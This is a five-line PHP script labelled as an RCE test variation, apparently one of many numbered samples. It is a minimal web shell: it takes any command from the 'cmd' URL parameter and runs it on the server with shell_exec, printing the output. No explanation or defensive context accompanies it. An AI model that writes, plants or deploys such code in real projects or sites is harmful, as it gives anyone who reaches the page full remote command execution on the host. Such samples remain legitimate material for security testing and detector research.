<?php
// RCE test variation #463
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>